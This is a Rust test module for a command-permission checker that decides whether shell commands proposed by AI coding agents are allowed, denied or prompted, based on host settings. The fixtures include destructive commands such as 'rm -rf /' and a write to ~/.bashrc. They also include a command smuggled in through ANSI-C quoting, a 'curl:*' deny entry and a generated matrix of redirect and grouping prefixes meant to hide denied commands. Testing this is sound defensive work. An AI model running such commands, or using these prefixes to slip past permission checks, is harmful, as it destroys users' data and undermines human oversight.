    fn test_file_redirect_never_auto_allowed() {
        let allow = vec!["git *".to_string()];
        assert_eq!(
            // nosemgrep: sensitive-path-reference -- test fixture
            check_command_with_rules("git log > ~/.bashrc", &[], &[], &allow),
            PermissionVerdict::Ask
        );
    }

    #[test]
    fn test_legitimate_multiline_allow() {
        let allow = vec!["git *".to_string(), "cargo *".to_string()];
        assert_eq!(
            check_command_with_rules("git status\ncargo build", &[], &[], &allow),
            PermissionVerdict::Allow
        );
    }

    #[test]
    fn test_legitimate_subshell_allow() {
        let allow = vec!["git *".to_string(), "cargo *".to_string()];
        assert_eq!(
            check_command_with_rules("(git status; cargo build)", &[], &[], &allow),
            PermissionVerdict::Allow
        );
    }

    #[test]
    fn test_legitimate_background_allow() {
        let allow = vec!["cargo *".to_string()];
        assert_eq!(
            check_command_with_rules("cargo build &", &[], &[], &allow),
            PermissionVerdict::Allow
        );
    }

    #[test]
    fn test_fd_dup_redirect_stays_allow() {
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git status 2>&1", &[], &[], &allow),
            PermissionVerdict::Allow
        );
        assert_eq!(
            check_command_with_rules("git log 2>/dev/null", &[], &[], &allow),
            PermissionVerdict::Allow
        );
    }

    #[test]
    fn test_deny_not_evaded_by_trailing_fd_dup() {
        let deny = vec!["git push --force".to_string()];
        let allow = vec!["git *".to_string()];
        assert_eq!(
            check_command_with_rules("git push --force 2>&1", &deny, &[], &allow),
            PermissionVerdict::Deny
        );
    }

    // --- Per-host rule extraction ---

    #[test]
    fn test_droid_no_settings_yields_no_rules() {
        // No hardcoded defaults: without explicit settings there are no rules.
        let (deny, ask, allow) = droid_rules_from_settings(&[]);
        assert!(deny.is_empty(), "no built-in denylist may be mirrored");
        assert!(ask.is_empty(), "Droid has no ask-shaped list");
        assert!(allow.is_empty(), "RTK never asserts allow for Droid");
    }

    #[test]
    fn test_droid_deny_lists_union_across_scopes() {
        // Project/local deny entries must be honored, not just global ones,
        // or the rtk-rename rewrite dodges them.
        let user = serde_json::json!({ "commandDenylist": ["git push"] });
        let user_local = serde_json::json!({ "commandBlocklist": ["curl:*"] });
        let project = serde_json::json!({ "commandDenylist": ["docker *"] });
        let (deny, ask, allow) = droid_rules_from_settings(&[user, user_local, project]);
        assert_eq!(deny, vec!["git push", "curl:*", "docker *"]);
        assert!(ask.is_empty());
        assert!(allow.is_empty());
    }

    #[test]
    fn test_droid_blocklist_and_denylist_both_deny() {
        let settings = serde_json::json!({
            "commandBlocklist": ["curl:*"],
            "commandDenylist": ["git push"],
        });
        let (deny, ask, allow) = droid_rules_from_settings(std::slice::from_ref(&settings));
        assert_eq!(deny, vec!["curl:*", "git push"]);
        assert!(ask.is_empty());
        assert!(allow.is_empty());
    }

    #[test]
    fn test_droid_allowlist_never_read() {
        // commandAllowlist is not consulted — the decision stays with Droid.
        let settings = serde_json::json!({
            "commandAllowlist": ["git status", "cargo test"],
        });
        let (deny, ask, allow) = droid_rules_from_settings(std::slice::from_ref(&settings));
        assert!(deny.is_empty());
        assert!(ask.is_empty());
        assert!(allow.is_empty());
    }

    #[test]
    fn test_droid_malformed_entries_filtered() {
        let settings = serde_json::json!({
            "commandDenylist": ["  git push  ", "", 42, null, {"nested": true}],
        });
        let (deny, _, _) = droid_rules_from_settings(std::slice::from_ref(&settings));
        assert_eq!(deny, vec!["git push"]);
    }

    #[test]
    fn test_droid_verdicts_deny_or_default_only() {
        // Without settings everything is Default — Droid decides natively.
        let (deny, ask, allow) = droid_rules_from_settings(&[]);
        assert_eq!(
            check_command_with_rules("git status --short", &deny, &ask, &allow),
            PermissionVerdict::Default
        );
        assert_eq!(
            check_command_with_rules("shutdown -h now", &deny, &ask, &allow),
            PermissionVerdict::Default
        );

        // An explicit deny entry from any scope yields Deny (step-aside)…
        let project = serde_json::json!({ "commandDenylist": ["git push"] });
        let (deny, ask, allow) = droid_rules_from_settings(std::slice::from_ref(&project));
        assert_eq!(
            check_command_with_rules("git push origin main", &deny, &ask, &allow),
            PermissionVerdict::Deny
        );
        // …while unlisted commands stay Default.
        assert_eq!(
            check_command_with_rules("cargo build", &deny, &ask, &allow),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_wrapped_rules_cursor_shell_only() {
        let v = serde_json::json!([
            "Shell(git)",
            "Shell(curl:*)",
            "Read(src/**)",
            "Shell(npm test)"
        ]);
        let mut out = Vec::new();
        append_wrapped_rules(Some(&v), &["Shell("], &mut out);
        assert_eq!(out, vec!["git", "curl:*", "npm test"]);
    }

    #[test]
    fn test_wrapped_rules_gemini_shell_variants() {
        let v = serde_json::json!([
            "run_shell_command(git)",
            "ShellTool(npm test)",
            "read_file",
            "run_shell_command"
        ]);
        let mut out = Vec::new();
        append_wrapped_rules(Some(&v), &["run_shell_command(", "ShellTool("], &mut out);
        assert_eq!(out, vec!["git", "npm test", "*"]);
    }

    #[test]
    fn test_wrapped_rules_extracted_patterns_match() {
        let mut allow = Vec::new();
        append_wrapped_rules(
            Some(&serde_json::json!(["Shell(git)"])),
            &["Shell("],
            &mut allow,
        );
        assert_eq!(
            check_command_with_rules("git status", &[], &[], &allow),
            PermissionVerdict::Allow
        );
        assert_eq!(
            check_command_with_rules("rm -rf /", &[], &[], &allow),
            PermissionVerdict::Default
        );
    }

    #[test]
    fn test_ansi_c_quote_divergence_is_never_auto_allowed() {
        let allow = vec!["git:*".to_string()];
        let cmd = r#"git status $'\'' ; rm -rf /"#;

        assert_eq!(
            check_command_with_rules(cmd, &[], &[], &allow),
            PermissionVerdict::Ask,
            "a command whose quoting the lexer cannot follow must prompt, \
             never auto-allow: {cmd}"
        );

        // The plain form still allows, so the guard is about the divergence
        // and not about `git` or about quoting in general.
        assert_eq!(
            check_command_with_rules("git status", &[], &[], &allow),
            PermissionVerdict::Allow
        );
        assert_eq!(
            check_command_with_rules("git commit -m 'a b'", &[], &[], &allow),
            PermissionVerdict::Allow
        );

        // An escaped `$` opens no ANSI-C span, so there is no divergence and
        // nothing to prompt about.
        assert_eq!(
            check_command_with_rules(r"git status \$'x'", &[], &[], &allow),
            PermissionVerdict::Allow,
            "an escaped dollar is a literal, not the start of ANSI-C quoting"
        );
    }

    #[test]
    fn test_leading_redirect_still_reaches_the_deny_rules() {
        let deny = vec!["git push --force".to_string()];

        for cmd in [
            "2>&1 git push --force",
            "1>&2 git push --force",
            ">out git push --force",
            "2>/dev/null git push --force",
            // Grammar in front of the redirect.
            "{ 2>&1 git push --force ; }",
            "! 2>&1 git push --force",
            "ls && { 2>&1 git push --force ; }",
            // Operands the tokenizer splits across several adjacent tokens.
            ">$HOME/x git push --force",
            "<&0 git push --force",
            // A boundary ends the operand even with no gap, or the command
            // right behind it is swallowed along with the filename.
            ">a|git push --force",
            ">a;git push --force",
            ">a&&git push --force",
            ">out& git push --force",
            "2>&1& git push --force",
            // No space after the `&`, which would create a token gap.
            "2>&1&git push --force",
            ">&2&git push --force",
            // Two redirects glued together.
            "2>&1<&0 git push --force",
        ] {
            assert_eq!(
                check_command_with_rules(cmd, &deny, &[], &[]),
                PermissionVerdict::Deny,
                "a leading redirect must not hide the command from deny rules: {cmd}"
            );
        }

        // A trailing redirect keeps its existing treatment.
        assert_eq!(
            check_command_with_rules("git push --force 2>&1", &deny, &[], &[]),
            PermissionVerdict::Deny
        );
    }

    /// Stepping over a leading redirect widens the allow side too: the command
    /// behind it matches the rule that covers it. Deliberate and rule-faithful,
    /// pinned here so it cannot change silently and so the boundary against a
    /// real file target stays visible.
    #[test]
    fn test_leading_redirect_lets_an_allowed_command_be_allowed() {
        let allow = vec!["git:*".to_string()];

        for cmd in [
            "2>&1 git status",
            "2>/dev/null git status",
            ">/dev/null git status",
        ] {
            assert_eq!(
                check_command_with_rules(cmd, &[], &[], &allow),
                PermissionVerdict::Allow,
                "fd-dup and /dev/null carry no data, so the command behind them \
                 is the whole command: {cmd}"
            );
        }

        // A real file target is still undecomposable, so it prompts.
        assert_eq!(
            check_command_with_rules(">out git status", &[], &[], &allow),
            PermissionVerdict::Ask
        );

        // `<&N` and `<&-` duplicate a descriptor, so like `>&N` they carry no
        // file target and need no prompt.
        for cmd in ["<&0 git status", "0<&1 git status", "0<&- git status"] {
            assert_eq!(
                check_command_with_rules(cmd, &[], &[], &allow),
                PermissionVerdict::Allow,
                "a descriptor duplication is not a file target: {cmd}"
            );
        }
    }

    #[test]
    fn test_brace_group_does_not_hide_a_denied_command() {
        let deny = vec!["rm -rf /".to_string()];

        for cmd in [
            "git status && { rm -rf / ; }",
            "git status && ! rm -rf /",
            "{ rm -rf / ; }",
        ] {
            assert_eq!(
                check_command_with_rules(cmd, &deny, &[], &[]),
                PermissionVerdict::Deny,
                "shell grammar in front of a command must not defeat a deny rule: {cmd}"
            );
        }
    }

    /// The class behind the cases above: a prefix built from redirects,
    /// grouping, negation and separators does not change which command runs,
    /// so none of them may hide it from a deny rule.
    #[test]
    fn test_no_prefix_construct_can_hide_a_denied_command() {
        // Generated rather than listed, so no spacing variant depends on
        // someone remembering to write it out.
        const REDIRECTS: &[&str] = &[
            "2>&1",
            "1>&2",
            ">&2",
            "2>&-",
            ">out",
            ">>out",
            "<in",
            "2>/dev/null",
            ">/dev/null",
            ">$HOME/x",
            "<&0",
            // An explicit fd number belongs to the redirect, on both arms.
            "0<&1",
            "0<&-",
            "3<&0",
            "1<in",
            "0</dev/null",
            "0>&1",
            "3>out",
        ];
        const SEPARATORS: &[&str] = &[
            " ", "&", "&&", ";", "|", "||", "& ", "&& ", "; ", "| ", "|| ",
        ];
        // Not segment boundaries, so the command stays glued to them.
        const GRAMMAR: &[&str] = &["{ ", "! ", "{ ! ", "! { ", "} "];

        let mut prefixes = vec![String::new()];
        for redirect in REDIRECTS {
            for separator in SEPARATORS {
                prefixes.push(format!("{redirect}{separator}"));
                for grammar in GRAMMAR {
                    prefixes.push(format!("{grammar}{redirect}{separator}"));
                    prefixes.push(format!("ls && {grammar}{redirect}{separator}"));
                }
            }
            // Two redirects glued with no separator between them.
            for second in REDIRECTS {
                prefixes.push(format!("{redirect}{second} "));
            }
        }
        // A line continuation is elided by bash, joining the words either side.
        for lead in ["", "ls && ", "ls; ", "ls | "] {
            prefixes.push(format!("{lead}\\\n"));
            prefixes.push(format!("{lead}\\\r\n"));
        }
        for grammar in GRAMMAR {
            prefixes.push((*grammar).to_string());
            prefixes.push(format!("ls && {grammar}"));
        }
        for lead in ["ls && ", "ls; ", "ls | ", "ls & "] {
            prefixes.push(lead.to_string());
        }

        let deny = vec!["rm -rf /".to_string()];
        for prefix in &prefixes {
            let cmd = format!("{prefix}rm -rf /");
            assert_eq!(
                check_command_with_rules(&cmd, &deny, &[], &[]),
                PermissionVerdict::Deny,
                "prefix {prefix:?} hid the denied command: {cmd:?} segmented to {:?}",
                split_compound_command(&cmd)
            );
        }
        assert!(
            prefixes.len() > 600,
            "matrix collapsed to {}",
            prefixes.len()
        );
    }

    #[test]
    fn test_grammar_residue_never_widens_allow() {
        let allow = vec!["git:*".to_string()];

        // One segment, so nothing else can hold Allow back: if the stripped
        // form ever reaches the allow loop, this flips to Allow.
        assert_eq!(
            check_command_with_rules("! git status", &[], &[], &allow),
            PermissionVerdict::Default,
            "negation must not inherit the allow rule of the command it negates"
        );
    }
}
